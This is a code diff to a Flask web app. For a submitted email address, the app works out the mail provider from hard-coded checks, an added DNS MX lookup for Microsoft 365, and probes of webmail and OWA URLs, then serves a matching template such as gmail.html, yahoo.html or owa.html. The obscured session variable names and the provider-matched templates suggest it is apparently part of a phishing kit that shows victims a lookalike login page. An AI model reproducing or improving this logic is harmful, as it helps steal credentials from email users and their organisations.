@@ -1,3 +1,4 @@
+import dns.resolver
 import requests
 from urllib.parse import urljoin
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
@@ -186,41 +187,47 @@ def route2():
     
     domain = web_param.split("@")[1].lower().strip()  # Extract and clean domain
     session['ins'] = domain
-
+    
     # Predefined domain redirects
     if domain == "gmail.com":
         return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
     elif domain == "yahoo.com":
         return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
     
-    # Define Webmail & OWA URLs (Skipping check for Gmail and Yahoo)
-    if domain not in ["gmail.com", "yahoo.com"]:
-        webmail_url = f"https://{domain}/webmail"
-        owa_urls = [
-            urljoin(f"https://owa.{domain}", "/owa/#path=/mail"),
-            urljoin(f"https://autodiscover.{domain}", "/owa/#path=/mail/search"),
-        ]
-
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-
-        # Function to check if a URL returns status code 200
-        def is_accessible(url):
-            try:
-                response = requests.get(url, headers=headers, timeout=25)
-                if response.status_code == 200:
-                    return True
-            except requests.RequestException:
-                pass
-            return False
-
-        # Check Webmail
-        if is_accessible(webmail_url):
-            return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-
-        # Check OWA
-        for owa_url in owa_urls:
-            if is_accessible(owa_url):
+    # Check MX records for mail.protection.outlook.com
+    try:
+        mx_records = dns.resolver.resolve(domain, 'MX')
+        for record in mx_records:
+            if "mail.protection.outlook.com" in str(record.exchange):
                 return render_template('owa.html', eman=session['eman'], ins=session['ins'])
+    except Exception as e:
+        pass  # Fail silently if DNS resolution fails
+    
+    # Define Webmail & OWA URLs (Skipping check for Gmail and Yahoo)
+    webmail_url = f"https://{domain}/webmail"
+    owa_urls = [
+        urljoin(f"https://owa.{domain}", "/owa/#path=/mail"),
+        urljoin(f"https://autodiscover.{domain}", "/owa/#path=/mail/search"),
+    ]
+    
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+    
+    # Function to check if a URL returns status code 200
+    def is_accessible(url):
+        try:
+            response = requests.get(url, headers=headers, timeout=10)
+            return response.status_code == 200
+        except requests.RequestException:
+            return False
+    
+    # Check Webmail
+    if is_accessible(webmail_url):
+        return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
+    
+    # Check OWA
+    for owa_url in owa_urls:
+        if is_accessible(owa_url):
+            return render_template('owa.html', eman=session['eman'], ins=session['ins'])
     
     # Default if no match, passing variables to index.html
     return render_template('index.html', eman=session.get('eman', ''), ins=session.get('ins', ''))
